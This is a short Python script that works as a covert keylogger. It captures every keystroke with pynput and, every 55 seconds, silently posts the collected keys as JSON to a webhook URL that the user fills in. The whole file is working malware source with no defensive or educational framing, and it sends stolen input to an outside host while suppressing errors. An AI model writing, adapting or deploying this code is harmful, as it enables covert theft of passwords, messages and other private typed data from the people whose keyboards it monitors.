import pynput
import requests
import json
import time

# Your webhook URL
WEBHOOK_URL = 'Enter Your webhook URL' 

# Interval in seconds to send keystrokes
INTERVAL = 55

# List to store captured keystrokes
captured_keystrokes = []

def send_keystrokes():
    # JSON payload with captured keystrokes
    data = {
        'keystrokes': captured_keystrokes
    }

    # Send the data to the webhook URL
    try:
        response = requests.post(WEBHOOK_URL, json=data, timeout=5)
        response.raise_for_status()  # Raises an error for bad responses
    except requests.exceptions.RequestException as e:
        pass

def on_press(key):
    try:
        captured_keystrokes.append(key.char)
    except AttributeError:
        captured_keystrokes.append(str(key))

def on_release(key):
    if key == pynput.keyboard.Key.esc:
        return False

# Set up the keyboard listener
listener = pynput.keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()

# Send captured keystrokes at regular intervals
try:
    while True:
        time.sleep(INTERVAL)
        send_keystrokes()
        captured_keystrokes.clear()
except KeyboardInterrupt:
    listener.stop()
